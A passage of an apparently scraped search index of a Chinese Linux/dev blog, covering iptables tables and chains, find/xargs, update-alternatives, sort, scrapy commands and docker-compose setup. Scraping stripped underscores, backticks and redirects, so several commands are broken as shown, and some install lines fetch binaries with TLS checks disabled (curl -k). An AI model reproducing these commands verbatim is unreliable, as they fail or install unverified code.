-A PREROUTING -p tcp --dport 22 -j MARK --set-mark 2\n\n1.1 filter、nat、mangle等规则表\n\nfilter表\n\n主要用于对数据包进行过滤，根据具体的规则决定是否放行该数据包（如DROP、ACCEPT、REJECT、LOG）。filter 表对应的内核模块为iptablefilter，包含三个规则链：\n\n    INPUT链：INPUT针对那些目的地是本地的包\n    FORWARD链：FORWARD过滤所有不是本地产生的并且目的地不是本地(即本机只是负责转发)的包\n    OUTPUT链：OUTPUT是用来过滤所有本地生成的包\n\nnat表\n\n主要用于修改数据包的IP地址、端口号等信息（网络地址转换，如SNAT、DNAT、MASQUERADE、REDIRECT）。属于一个流的包(因为包\n的大小限制导致数据可能会被分成多个数据包)只会经过这个表一次。如果第一个包被允许做NAT或Masqueraded，那么余下的包都会自动地被做相同的操作，也就是说，余下的包不会再通过这个表。表对应的内核模块为 iptable_nat，包含三个链：\n\n    PREROUTING链：作用是在包刚刚到达防火墙时改变它的目的地址\n    OUTPUT链：改变本地产生的包的目的地址\n    POSTROUTING链：在包就要离开防火墙之前改变其源地址\n\nmangle表\n\n主要用于修改数据包的TOS（Type Of Service，服务类型）、TTL（Time To Live，生存周期）指以及为数据包设置Mark标记，以实现Qos(Quality Of Service，服务质量)调整以及策略路由等应用，由于需要相应的路由设备支持，因此应用并不广泛。包含五个规则链——PREROUTING，POSTROUTING，INPUT，OUTPUT，FORWARD。\n\nraw表\n\n是自1.2.9以后版本的iptables新增的表，主要用于决定数据包是否被状态跟踪机制处理。在匹配数据包时，raw表的规则要优先于其他表。包含两条规则链——OUTPUT、PREROUTING\n\niptables中数据包和4种被跟踪连接的4种不同状态：\n\n    NEW：该包想要开始一个连接（重新连接或将连接重定向）\n    RELATED：该包是属于某个已经建立的连接所建立的新连接。例如：FTP的数据传输连接就是控制连接所 RELATED出来的连接。--icmp-type 0 ( ping 应答) 就是--icmp-type 8 (ping 请求)所RELATED出来的。\n    ESTABLISHED ：只要发送并接到应答，一个数据连接从NEW变为ESTABLISHED,而且该状态会继续匹配这个连接的后续数据包。\n    INVALID：数据包不能被识别属于哪个连接或没有任何状态比如内存溢出，收到不知属于哪个连接的ICMP错误信息，一般应该DROP这个状态的任何数据。\n\n1.2 INPUT、FORWARD等规则链和规则\n\n在处理各种数据包时，根据防火墙规则的不同介入时机，iptables供涉及5种默认规则链，从应用时间点的角度理解这些链：\n\n    INPUT链：当接收到防火墙本机地址的数据包（入站）时，应用此链中的规则。\n    OUTPUT链：当防火墙本机向外发送数据包（出站）时，应用此链中的规则。\n    FORWARD链：当接收到需要通过防火墙发送给其他地址的数据包（转发）时，应用此链中的规则。\n    PREROUTING链：在对数据包作路由选择之前，应用此链中的规则，如DNAT。\n    POSTROUTING链：在对数据包作路由选择之后，应用此链中的规则，如SNAT。\n\n--  PREROUTING--  [ROUTE]--  FORWARD--  POSTROUTING--  mangle        |       mangle        ^ mangle\n      nat          |       filter        |  nat\n                   |                     |\n                   |                     |\n                   v                     |\n                 INPUT                 OUTPUT\n                   | mangle              ^ mangle\n                   | filter              |  nat\n                   v","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 find","title":"Linux命令 find","text":"---\nFind replace files Command Line\n\nxargs 之所以能用到这个命令，关键是由于很多命令不支持|管道来传递参数，而日常工作中有有这个必要，所以就有了xargs命令，例如：\n这个命令是错误的\nfind /sbin -perm +700 |ls -l\n这样才是正确的\nfind /sbin -perm +700 |xargs ls -l   \n\n| 管道是实现“将前面的标准输出作为后面的标准输入”\nxargs是实现“将标准输入作为命令的参数”\necho \"--help\"|cat\necho \"--help\"|xargs cat\n\n多线程处理数据\nfind . -type f | xargs -i -n 1 -P 20 sh -c \"grep \"asdf\" {}   {}.log\"\ncat url_file |xargs -n 1 -P 100 wget\n\n 参数详解\n-prune                       #忽略某个目录\n-name   filename             #查找名为filename的文件\n\n-type   b/c/d/p/l/f/s          #查是块设备block、字符设备character、目录directory、管道pipe、符号链接link、普通文件file,socket\n-size   b/c/w/k/M/G          #查长度为n块[或n字节]的文件 [+|-]b[block]/c[bytes]/w[word]/\n-perm [+|-] MODE             #按执行权限来查找; 不带[+|-]表示精确权限匹配，+表示任何一类用户的任何一位权限匹配 - 表示每类用户的每位权限都匹配\n时间属性\n-amin    -n +n\n-mmin    -n +n\n-cmin    -n +n\n-atime   -n +n               按文件访问时间来查\n-mtime   -n +n               #按文件更改时间来查找文件，-n指n天以内，+n指n天以前\n-ctime   -n +n               #按文件创建时间来查找文件，-n指n天以内，+n指n天以前\n-newer   f1 !f2              #查更改时间比f1新但比f2旧的文件\n用户属性\n-user    username            按文件属主来查找\n-group groupname             #按组来查找\n-user:      查找owner属于-user选项后面指定用户的文件。\n! -user:    查找owner不属于-user选项后面指定用户的文件。\n-group:   查找group属于-group选项后面指定组的文件。\n! -group: 查找group不属于-group选项后面指定组的文件。\n-nogroup                     #查无有效属组的文件，即文件的属组在/etc/groups中不存在\n-nouser                      #查无有效属主的文件，即文件的属主在/etc/passwd中不存\n-depth                       #使查找在进入子目录前先行查找完本目录\n-mount                       #查文件时不跨越文件系统mount点\n-follow                      #如果遇到符号链接文件，就跟踪链接所指的文件\n-fstype                      #查位于某一类型文件系统中的文件，这些文件系统类型通常可 在/etc/fstab中找到\n-cpio                        #对匹配的文件使用cpio命令，将他们备份到磁带设备中\n\nfind [PATH] [option] [action]  \n\n与时间有关的参数：  \n-mtime n : n为数字，意思为在n天之前的“一天内”被更改过的文件；  \n-mtime +n : 列出在n天之前（不含n天本身）被更改过的文件名；  \n-mtime -n : 列出在n天之内（含n天本身）被更改过的文件名；  \n-newer file : 列出比file还要新的文件名  \n 例如：  \nfind /root -mtime 0 # 在当前目录下查找今天之内有改动的文件  \n\n与用户或用户组名有关的参数：  \n-user name : 列出文件所有者为name的文件  \n-group name : 列出文件所属用户组为name的文件  \n-uid n : 列出文件所有者为用户ID为n的文件  \n-gid n : 列出文件所属用户组为用户组ID为n的文件  \n 例如：  \nfind /home/ljianhui -user ljianhui # 在目录/home/ljianhui中找出所有者为ljianhui的文件  \n\n与文件权限及名称有关的参数：  \n-name filename ：找出文件名为filename的文件  \n-size [+-]SIZE ：找出比SIZE还要大（+）或小（-）的文件  \n-tpye TYPE ：查找文件的类型为TYPE的文件，TYPE的值主要有：一般文件（f)、设备文件（b、c）、  \n             目录（d）、连接文件（l）、socket（s）、FIFO管道文件（p）；  \n-perm mode ：查找文件权限刚好等于mode的文件，mode用数字表示，如0755；  \n-perm -mode ：查找文件权限必须要全部包括mode权限的文件，mode用数字表示  \n-perm +mode ：查找文件权限包含任一mode的权限的文件，mode用数字表示  \n 例如：  \nfind / -name passwd # 查找文件名为passwd的文件  \nfind . -perm 0755 # 查找当前目录中文件权限的0755的文件  \nfind . -size +12k # 查找当前目录中大于12KB的文件，注意c表示byte","tags":null},{"location":"//blog.pytool.com/Post/php/2016-06-01 PHP 基础","title":"Linux命令 PHP","text":"Php 设置时区\n使用datedefaulttimezoneset()设置 datedefaulttimezoneset('PRC');   datedefaulttimezoneset('Asia/shanghai');\niniset('date.timezone','Asia/Shanghai');\n修改错误级别配置（不推荐）\n修改php.ini，显式设置date.timezone=PRC","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 update-alternatives","title":"Linux update-alternatives","text":"---\nupdate-alternatives 可以创建、删除、修复、软连接，还能显示出已存在软连接的信息，而所有的这些就构成了备选方案系统（alternatives system）。\n\n很多时候我们会将拥有相同或相似功能的不同应用程序安装在同一个操作系统上，例如同一个操作系统上的不同文本编辑器。这给了这个系统的用户在编辑文本时有了更多的选择，如果用户愿意他们可以自由选择任意一个来使用。但是假如用户没有指定他想用哪一个编辑器，那么会怎样呢？对于程序来说它很尴尬，因为它没有人一样的意愿去做出一个所谓“好”的选择。\n\n不过alternatives系统的出现解决了这个问题。文件系统中的一个共用名（generic name）被那些拥有可交换功能的文件所共享，而备选方案系统和系统管理员共同决定具体是哪一个文件被这个共用名所指定（就是说备选方案系统并不能彻底地帮助用户来管理软连接，毕竟以人为本嘛）。举个例子，如果文本编辑器ed(1)和nvi(1)被安装在一个系统里，并且假定备选系统方案让共用名（/usr/bin/editor）默认指向/usr/bin/nvi，那么系统管理员就可以废除这个指定并且让共用名指向/usr/bin/ed，之后除非有特别明确的必要，否则备选方案系统不会改变这个设定。\n\n其实，共用名并不是直接指向已选定程序（命令）的软连接，而是指向备选方案目录（alternatives directory）中的一个名字。这个名字也是一个软连接，它才是直接指向已选定程序（命令）。这种机制的目的是将管理员所做的更改限定在/etc目录下的相应配置文件中：FHS可以很好地给出这样做的好处。\n\n当任意一个提供特定功能的文件（程序/包）被安装、删除或者更改，update-alternatives都会被调用以更新备选方案中相应文件的信息。update-alternatives经常被Debian包中psstinst（配置）或prerm（安装）脚本调用。\n\n那些为了更好地发挥作用而被同步的多个备选方案被称作组；例如，当多个版本的vi编辑器都被安装时，被/usr/share/man/man1/vi.1指定的man page就应该跟当前被/usr/bin/vi指定的vi版本相对应（不同版本的vi都有各自的man，我们要做的就是要man的时候显示的man page与我们正在使用的vi编辑器对应）。\n\n每一个链接组（link group）都有两种不同的模式：自动模式和手动模式，任一给定时刻一个组都是而且只能是其中的一种模式。如果一个组处于自动模式，当包被安装或删除时，备选方案系统会自己决定是否和如何来更新相应链接（links）。如果处于手动模式，备选方案系统会保留原先管理员所做的选择并且避免改变链接（除非发生broken）。\n\n当第一次被安装到系统时链接组被分配为自动模式；如果之后系统管理员对模式的设置做出更改，这个组会被自动转换为手动模式。\n\n备选方案都有自己的级别（priority）；当一个链接组处于自动模式时，它的成员会指向级别高的备选方案。\n\n当使用--config选项时，update-alternatives 会列出所有链接组的主链接名，当前被选择的组会以号标出。可以在提示下对链接指向做出改变，不过这会将模式变为手动。如果想回复自动模式，你可以使用--auto选项，或者--config重新选择标为自动的组。\n\n如果你不想用--config提供的交互模式，你也可以使用--set选项\n\n提供相同文件的不同包需要进行同步，换句话说，update-alternatives的使用是对所用牵连的包起作用的。\n\n   update-alternatives是用来维护系统命令的符号链接，以决定系统默认使用什么命令，可以设置系统默认加载的首选程序\n\n我们可能会同时安装有很多功能类似的程序和可选配置，如Web浏览器程序(firefox，konqueror)、窗口管理器(wmaker、metacity)和鼠标的不同主题等。这样，用户在使用系统时就可进行选择，以满足自已的需求。\n\n但对于普通用户来说，在这些程序间进行选择配置会较困难。update-alternatives工具就是为了解决这个问题，帮助用户能方便地选择自已喜欢程序和配置系统功能。\n\n  比如我系统已安装有java 1.6，还想要安装java 1.7，但我不想卸载java 1.6。就可以通过update-alternatives  --config在多个java版本间进程切换。update-alternatives是用于在多个同类型命令中进行切换的一个命令。\n\n在说明update-alternatives的详细用法之前，先让我们看看系统中已有的例子。\n\n打开终端，执行下面的命令：\n\n[root@SC4303 ~]# java -version\njava version \"1.7.045\"\nOpenJDK Runtime Environment (rhel-2.4.3.3.el6-x8664 u45-b15)\nOpenJDK 64-Bit Server VM (build 24.45-b08, mixed mode)\n[root@SC4303 ~]# which java\n/usr/bin/java\n[root@SC4303 ~]# ls -l /usr/bin/java\nlrwxrwxrwx. 1 root root 22 Dec  8 20:49 /usr/bin/java -  /etc/alternatives/java\n[root@SC4303 ~]# ls -l /etc/alternatives/java\nlrwxrwxrwx. 1 root root 46 Dec  8 20:49 /etc/alternatives/java -  /usr/lib/jvm/jre-1.7.0-openjdk.x8664/bin/java\n\njava这个可执行命令实际是一个链接，指向了/etc/alternatives/java。而这个也是一个链接，指向了/usr/lib/jvm/jre-1.7.0-openjdk.x8664/bin/java这才是最终的可执行文件。之所以建立这样两个链接，是为了方便脚本程序的编写和系统的管理。\n\n2、使用\n\nroot@xj alternatives]# ll $(which update-alternatives)\nlrwxrwxrwx. 1 root root 12 10月 27 16:39 /usr/sbin/update-alternatives -  alternatives\n[root@xj alternatives]# ll $(which alternatives)\n-rwxr-xr-x 1 root root 27496 9月  23 2013 /usr/sbin/alternatives\n\n以上可知：update-alternatives和alternatives是同一个命令，只是为了和debian系统一吗？\n\n命令格式:\n\n   update-alternatives  [options]  command\n\n[root@xxj ~]$ update-alternatives\nalternatives（备用）版本 1.3.61 - 版权 (C) 2001 红帽公司\n在 GNU 公共许可条款下，本软件可被自由地重发行。\n\n用法：alternatives --install 链接 名称 路径 优先度\n               [--initscript 服务]\n               [--slave 链接 名称 路径]\n  alternatives --remove 名称 路径\n  alternatives --auto 名称\n  alternatives --config 名称\n  alternatives --display 名称\n  alternatives --set 名称 路径\n  alternatives --list\n\n公用选项：--verbose --test --help --usage --version\n           --altdir 目录 --admindir 目录\n\ninstall选项\n\n      install选项的功能就是增加一组新的系统命令链接符了\n使用语法：\n\nupdate-alternatives  --install link name path priority [--slave link name path]...\n\n其中link为系统中功能相同软件的公共链接目录，比如/usr/bin/java(需绝对目录);\n\nname为命令链接符名称,如java；\n\npath为你所要使用新命令、新软件的所在目录；\n\npriority为优先级，当命令链接已存在时，需高于当前值，因为当alternative为自动模式时,系统默认启用priority高的链接;\n\n--slave为从alternative。\n\nalternative有两种模式：auto和manual，默认都为auto模式，因为大多数情况下update-alternatives命令都被postinst (configure) or prerm (install)调用的，如果将其更改成手动的话安装脚本将不会更新它了。\n\n例如：\n\nupdate-alternatives --install /usr/bin/java java /usr/local/lib/java/jdk1.7.067 17067   \n/usr/bin/java   java link所在的路径\n java  创建link的名称\n/usr/local/lib/java/jdk1.7.067  java链接指向的路径\n 17067  根据版本号设置的优先级（更改的优先级需要大于当前的）\n\n注意：\n\n    这里，你不需要再/etc/alternatives/下面建立任何你想设置的链接名称，因为这完全可以通过update-alternative  --install命令来实现;而且你也不需要在/usr/bin/目录下建立相关链接名称，理由同上。你只需要确定这几个功能类似的软件的源目的地，然后执行如下命令:(以gcc为例)\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-3.3 100(这个优先级100必须键入)\nsudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.1 90\nsudo update-alternatives --install /usr/bin/gcc gcc /ur/bing/gcc-4.2 80\n\nremove选项\n\n  remove选项的功能是删除一个alternative及相关从alternative\n\n使用语法：\n\nupdate-alternatives --remove name path\n\n其中name与path与install中的一致，如果所删除的链接组中还有其他链接的话，系统将会自动从其他中选择一个priority高的链接作为默认为链接。\n\n例如：update-alternatives --remove  java /usr/local/lib/java/jdk1.7.0_67\nauto选项\n\n    auto选项用于修改命令的模式，\n\n语法如下：\n\nupdate-alternatives --auto name    只有两个auto和manual模式，默认都为auto模式\n\nconfig选项\n\n    config选项功能为在现有的命令链接选择一个作为系统默认的\n\n使用语法为：\n\n update-alternatives --config name\n\n[root@localhost yxkong]# update-alternatives --config java\n共有 2 个提供“java”的程序。\n选项    命令","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 sort","title":"Linux命令 sort","text":"sort：将文本文件内容加以排序。\n\nsort -u [file] = sort [file] | uniq （去重）\n参数说明\n-b 忽略每行前面开始处的空格字符\n-c 检查文件是否已经按照顺序排序，并不执行排序\n-d 排序时，只处理英文字母、数字及空格字符，忽略其他的字符\n-f 排序时，将小写字母视为大写字母\n-i 排序时，除了040至176之间的ASCII（可打印的）字符外，忽略其他的字符\n-m 将几个排序好的文件进行合并\n-M 将前面3个字符依照月份的缩写进行排序\n-n 依照数值的大小排序\n-o输出文件 讲排序后的结果存入指定的文件\n-r 以相反的顺序来排序\n-t分隔字符 指定排序时所用的栏位分割字符\n+起始栏位-结束栏位 以指定的栏位来排序，范围由起始兰位到结束栏位的前一栏位\n--help 显示帮助\n--version 显示版本信息\n-u 对排序后认为相同的行只留其中一行","tags":null},{"location":"//blog.pytool.com/Post/scrapy/2014-04-25-scrapy-command-line-tool","title":"scrapy 命令行工具","text":"---\n原文地址：http://doc.scrapy.org/en/latest/topics/commands.html\n\nscrapy 通过command-line tool来控制，为了和subcommands区分，我们把前者叫做“scrapy tool”,把后者叫做“commands”或者“scrapy commands”。\n\nscrapy默认项目结构\nscrapy.cfg文件所在目录是项目的根目录。该文件包含了Python模块的名字，它用来定义项目的设置。\n\n使用scrapy tool\n你可以不带参数的执行scrapy，它会打印一些哟用的帮助信息和可用的commands。\n\n    Scrapy X.Y - no active project\n\n    Usage:\n      scrapy command [options] [args]\n\n    Available commands:\n      crawl         Run a spider\n      fetch         Fetch a URL using the Scrapy downloader\n    [...]\n\n第一行会显示使用的scrapy的版本号和当前项目，前提是你在一个scrapy项目中。上面的例子，是在项目外执行scrapy。如果你在项目中执行，会得到类似如下结果：\n\n    Scrapy X.Y - project: myproject\n\n    Usage:\n      scrapy command [options] [args]\n\n    [...]\n\n创建项目\n通常用scrapy tool干得第一件事就是创建项目：\n\n    scrapy startproject myproject\n\n该命令会在myproject目录下创建一个scrapy项目。\n\n控制项目\n例如，创建一个新蜘蛛：\n\n    scrapy genspider mydomain mydomain.com\n\n有一些命令必须在项目中运行，另外的则不需要。还有一些命令在项目中运行和在项目外运行会稍有区别。\n\n可用的tool commands\n查看所有的可用的命令：\n\n    scrapy -h\n\n查看单条命令的帮助：\n\n    scrapy command -h\n\n命令分为两类，一类是全局命令（不需要依赖某个项目），一类是项目命令（Project-only）\n\n全局命令\n\n startproject\n settings\n runspider\n shell\n fetch\n view\n version\n\n项目命令\n\n crawl\n check\n list\n edit\n parse\n genspider\n deploy\n bench\n\nstartproject\n 语法：scrapy startproject projectname\n 全局命令\n\n它会在projectname目录下创建一个名为projectname的scrapy新项目。\n\ngenspider\n\n 语法：scrapy genspider [-t template] name domain\n 项目命令\n\n该命令可以方便快捷的基于预定义的模板创建蜘蛛，当然你也可以不用此命令，而是直接写代码创建。\n\n    $ scrapy genspider -l  //列出可用模板\n    Available templates:\n      basic\n      crawl\n      csvfeed\n      xmlfeed\n\n    $ scrapy genspider -d basic  //显示某个具体模板\n    import scrapy\n\n    class $classname(scrapy.Spider):\n        name = \"$name\"\n        alloweddomains = [\"$domain\"]\n        starturls = (\n            'http://www.$domain/',\n            )\n\n        def parse(self, response):\n            pass\n\n    $ scrapy genspider -t basic example example.com\n    Created spider 'example' using template 'basic' in module:\n      mybot.spiders.example\n\ncrawl\n\n 语法：scrapy crawl spider\n 项目命令\n\n用某个蜘蛛开始爬\n\ncheck\n\n 语法：scrapy check [-l] spider\n 项目命令\n\nRun contract checks.\n\n例如：\n\n\t$ scrapy check -l\n\tfirstspider\n  \tparse\n  \tparseitem\n\tsecondspider\n  \tparse\n  \tparseitem\n\n\t$ scrapy check\n\t[FAILED] firstspider:parseitem\n\t      'RetailPricex' field is missing\n\n\t[FAILED] firstspider:parse\n\t      Returned 92 requests, expected 0..4\n\n ps:已经发生改变，以实际情况为准。\n\nlist\n\n 语法：scrapy list\n 项目命令\n\n列出当前项目中所有的蜘蛛。\n\nedit\n\n 语法：scrapy edit spider\n 项目命令\n\n用EDITOR设置的编辑器编辑给定的蜘蛛。\n\nfetch\n\n 语法：scrapy fetch url\n 全局命令\n\n注意url必须带http://\n\n使用Scrapy downloader 下载指定url,并将内容输出到标准输出。\n\n有意思的地方是：它会以蜘蛛真正下载网页的方式获取网页。例如：如果蜘蛛有USERAGENT属性，那会重写默认的User Agent，它会使用USERAGENT。\n\n所以，该命令可以用来查看蜘蛛如何下载一个指定网页\n\n如果你在项目外执行该命令，那么没有特定的蜘蛛行为会被应用到它上，它会使用默认的Scrapy downloader设置。\n\n\t$ scrapy fetch --nolog http://www.example.com/some/page.html\n\t[ ... html content here ... ]\n\n\t$ scrapy fetch --nolog --headers http://www.example.com/\n\t{'Accept-Ranges': ['bytes'],\n\t 'Age': ['1263   '],\n \t'Connection': ['close     '],\n \t'Content-Length': ['596'],\n \t'Content-Type': ['text/html; charset=UTF-8'],\n \t'Date': ['Wed, 18 Aug 2010 23:59:46 GMT'],\n\t'Etag': ['\"573c1-254-48c9c87349680\"'],\n \t'Last-Modified': ['Fri, 30 Jul 2010 15:30:18 GMT'],\n \t'Server': ['Apache/2.2.3 (CentOS)']}\n\nview\n\n 语法：scrapy view url\n 全局命令\n\nscrapy会把蜘蛛看到的网页保存下来，并在浏览器中打开。因为有时候蜘蛛看到的网页和用户看到的网页不一样，所以它可以用来检查蜘蛛看到的并确认是你想要的。\n\nshell\n\n 语法：scrapy shell [url]\n 全局命令\n\n以给定的url(如果指定了)启动Scrapy shell 。\n\nparse\n\n 语法：scrapy parse url [options]\n 项目命令\n\n获取给定网页，并交给蜘蛛解析，如果给定了--callback，则用给定函数解析，否则用parse解析。\n\n支持选项：\n\n --spider=SPIDER: 跳过蜘蛛自动检测，强制使用指定蜘蛛\n --a NAME=VALUE: 设置蜘蛛参数 (may be repeated)\n --callback or -c: 用来解析response的回调函数\n --pipelines: process items through pipelines\n --rules or -r: use CrawlSpider rules to discover the callback (i.e. spider method) to use for parsing the response\n --noitems: don’t show scraped items\n --nolinks: don’t show extracted links\n --nocolour: avoid using pygments to colorize the output\n --depth or -d: depth level for which the requests should be followed recursively (default: 1)\n --verbose or -v: display information for each depth level\n\n 例如：\n\n\t$ scrapy parse http://www.example.com/ -c parse_item\n\t[ ... scrapy log lines crawling example.com spider ... ]\n\n\t      STATUS DEPTH LEVEL 1 \u003c\u003c\u003c\n\t Scraped Items","tags":null},{"location":"//blog.pytool.com/Post/docker/2016-01-02 Linux命令 Docker-compose","title":"Linux命令 docker-compose","text":"https://github.com/docker/compose\nhttps://github.com/docker/compose/releases\nDocker Compose文件详解 V2 \n官方参考文档 Compose file version 3 reference - Docker Documentation\n\nInstall docker-compose\nsudo curl -L https://get.daocloud.io/docker/compose/releases/download/1.12.0/docker-compose-uname -s-uname -m -o /usr/local/bin/docker-compose\nchmod +x /usr/local/bin/docker-compose\n\ncurl -Lkx 127.0.0.1:8087 https://github.com/docker/compose/releases/download/1.12.0/docker-compose-uname -s-uname -m|sudo tee /usr/local/bin/docker-compose\nsudo curl -Lkx 127.0.0.1:8087 https://github.com/docker/compose/releases/download/1.12.0/docker-compose-uname -s-uname -m -o /usr/local/bin/docker-compose\nsudo chmod +x /usr/local/bin/docker-compose\n\nuname -s linux\nuname -m x8664\ncurl -L \"https://github.com/docker/compose/releases/download/1.8.1/docker-compose-$(uname -s)-$(uname -m)\"   /usr/local/bin/docker-compose\ncurl -Lkx 127.0.0.1:8087 https://github.com/docker/compose/releases/download/1.8.0/docker-compose-uname -s-uname -m   /usr/local/bin/docker-compose\ncurl -L https://github.com/docker/compose/releases/download/1.8.1/run.sh   /usr/local/bin/docker-compose\n\npip\napt-get install python-pip python-dev\nsudo pip install --upgrade pip\npip install -U docker-compose\n\n 常用库\ndocker-library\nRepositories\n\ndockerfiles\ngit remote add seapy https://github.com/seapy/dockerfiles\ngit subtree add -P Subtree/seapy seapy master\ngit clone --depth 1 https://github.com/vimagick/dockerfiles subclone/vimagick\n\n docker-compose常用命令\n\n--verbose：输出详细信息\n-f 制定一个非docker-compose.yml命名的yaml文件\n-p 设置一个项目名称（默认是directory名）\ndocker-compose的动作包括：\nbuild：构建服务\nkill -s SIGINT：给服务发送特定的信号。\nlogs：输出日志\nport：输出绑定的端口\nps：输出运行的容器\npull：pull服务的image\nrm：删除停止的容器\nrun: 运行某个服务，例如docker-compose run web python manage.py shell\nstart：运行某个服务中存在的容器。\nstop:停止某个服务中存在的容器。\nup：create + run + attach容器到服务。\nscale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3\n\nDockerfile\nRUN groupadd -g 1000 user \u0026\u0026 \\\n    useradd -m -g user -u 1000 user\nUSER user\nWORKDIR /app\n docker-compose.Yaml文件参考\n在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：\nimage:镜像的ID\nbuild:直接从pwd的Dockerfile来build，而非通过image选项来pull\nlinks：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]\nexternallinks：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links\ncommand：替换默认的command命令\nports: 导出端口。格式可以是：\n\nports:-\"3000\"-\"8000:8000\"-\"127.0.0.1:8001:8001\"\n\nexpose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。\nvolumes：加载路径作为卷，可以指定只读模式：\n\nvolumes:-/var/lib/mysql\n cache/:/tmp/cache\n -~/configs:/etc/configs/:ro\n\nvolumesfrom：加载其他容器或者服务的所有卷\n\nenvironment:- RACKENV=development\n  SESSIONSECRET\n\nenvfile：从一个文件中导入环境变量，文件的格式为RACKENV=development\nextends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：\n\ncommon.yml\nwebapp:\n  build:./webapp\n  environment:- DEBUG=false- SENDEMAILS=false\ndevelopment.yml\nweb:extends:\n    file: common.yml\n    service: webapp\n  ports:-\"8000:8000\"\n  links:- db\n  environment:- DEBUG=true\ndb:\n  image: postgres\n\nnet：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。\ndns：可以设置一个或多个自定义的DNS地址。\ndnssearch:可以设置一个或多个DNS的扫描域。\n其他的workingdir, entrypoint, user, hostname, domainname, memlimit, privileged, restart, stdinopen, tty, cpushares，和docker run命令是一样的，这些命令都是单行的命令。例如：\n\ncpushares:73\nworkingdir:/code\nentrypoint: /code/entrypoint.sh\nuser: postgresql\nhostname: foo\ndomainname: foo.com\nmemlimit:1000000000\nprivileged:true\nrestart: always\nstdinopen:true\ntty:true\n\n编译\ndocker-compose -f docker-compose.yml build\n说明 编译后的镜像名称 以docker-compose.yml 所在的文件夹目录名为前缀加上服务名\n\n YAML 模板文件\ncompose file 变量的使用\n有两种方式：\n通过系统环境变量进行传递\n    $ export EXTERNALPORT=7000\n    $ docker-compose up           EXTERNALPORT will be 7000\n通过执行docker-compose up 的目录(即工作目录)创建.env 文件传递\n    $ unset EXTERNALPORT\n    $ echo \"EXTERNALPORT=6000\"   .env\n    $ docker-compose up          # EXTERNALPORT will be 6000\n\nweb:\n  build: .\n  ports:\n    \"${EXTERNALPORT:-default}:5000\"\n\n    ${VARIABLE:-default} will evaluate to default if VARIABLE is unset or empty in the environment.\n    ${VARIABLE-default} will evaluate to default only if VARIABLE is unset in the environment.\n\n当想忽略掉带$的字符串时 可以使用两个 $$字符\n\nweb:\n  build: .\n  command: \"$$VARNOTINTERPOLATEDBYCOMPOSE\"\n\n默认的模板文件是 docker-compose.yml，其中定义的每个服务都必须通过 image 指令指定镜像或 build 指令（需要 Dockerfile）来自动构建。\n\n其它大部分指令都跟 docker run 中的类似。\n\n如果使用 build 指令，在 Dockerfile 中设置的选项(例如：CMD, EXPOSE, VOLUME, ENV 等) 将会自动被获取，无需在 docker-compose.yml 中再次设置。\n\nimage\n\n指定为镜像名称或镜像 ID。如果镜像在本地不存在，Compose 将会尝试拉去这个镜像。\n\n例如：\nimage: ubuntu\nimage: orchardup/postgresql\nimage: a4bc65fd\n\n build\n\n指定 Dockerfile 所在文件夹的路径。 Compose 将会利用它自动构建这个镜像，然后使用这个镜像。\n\nbuild: /path/to/build/dir\n\ncommand\n\n覆盖容器启动后默认执行的命令。\n\ncommand: bundle exec thin -p 3000\n\n links\n\n链接到其它服务中的容器。使用服务名称（同时作为别名）或服务名称：服务别名 （SERVICE:ALIAS） 格式都可以。\n\nlinks:\n db\n db:database\n redis\n\n使用的别名将会自动在服务容器中的 /etc/hosts 里创建。例如：\n\n172.17.2.186  db\n172.17.2.186  database\n172.17.2.187  redis\n\n相应的环境变量也将被创建。\n\nexternallinks\n链接到 docker-compose.yml 外部的容器，甚至 并非 Compose 管理的容器。参数格式跟 links 类似。\n\nexternallinks:\n redis1\n projectdb1:mysql\n projectdb1:postgresql\n\n ports\n\n暴露端口信息。\n\n使用宿主：容器 （HOST:CONTAINER）格式或者仅仅指定容器的端口（宿主将会随机选择端口）都可以。\n\nports:\n \"3000\"\n \"8000:8000\"\n \"49100:22\"\n \"127.0.0.1:8001:8001\"\n\n注：当使用 HOST:CONTAINER 格式来映射端口时，如果你使用的容器端口小于 60 你可能会得到错误得结果，因为 YAML 将会解析 xx:yy 这种数字格式为 60 进制。所以建议采用字符串格式。\n\nexpose\n\n暴露端口，但不映射到宿主机，只被连接的服务访问。\n\n仅可以指定内部端口为参数\n\nexpose:\n \"3000\"\n \"8000\"\n\n volumes\n\n卷挂载路径设置。可以设置宿主机路径 （HOST:CONTAINER） 或加上访问模式 （HOST:CONTAINER:ro）。\n\nvolumes:\n /var/lib/mysql\n cache/:/tmp/cache\n ~/configs:/etc/configs/:ro\n\nvolumesfrom\n\n从另一个服务或容器挂载它的所有卷。\n\nvolumesfrom:\n servicename\n containername\n\n environment\n\n设置环境变量。你可以使用数组或字典两种格式。\n\n只给定名称的变量会自动获取它在 Compose 主机上的值，可以用来防止泄露不必要的数据。\n\nenvironment:\n  RACKENV: development\n  SESSIONSECRET:\n\nenvironment:\n  RACKENV=development\n  SESSIONSECRET\n\nenvfile\n从文件中获取环境变量，可以为单独的文件路径或列表。\n\n如果通过 docker-compose -f FILE 指定了模板文件，则 envfile 中路径会基于模板文件路径。\n\n如果有变量名称与 environment 指令冲突，则以后者为准。\n\nenvfile: .env\n\nenvfile:\n  ./common.env\n  ./apps/web.env\n  /opt/secrets.env\n\n环境变量文件中每一行必须符合格式，支持 `` 开头的注释行。\n\ncommon.env: Set Rails/Rack environment\nRACKENV=development\n\n extends\n基于已有的服务进行扩展。例如我们已经有了一个 webapp 服务，模板文件为 common.yml。\ncommon.yml\nwebapp:\n  build: ./webapp\n  environment:\n    DEBUG=false\n    SENDEMAILS=false\n\n编写一个新的 development.yml 文件，使用 common.yml 中的 webapp 服务进行扩展。\n development.yml\nweb:\n  extends:\n    file: common.yml\n    service: webapp\n  ports:\n    \"8000:8000\"\n  links:\n    db\n  environment:\n    DEBUG=true\ndb:\n  image: 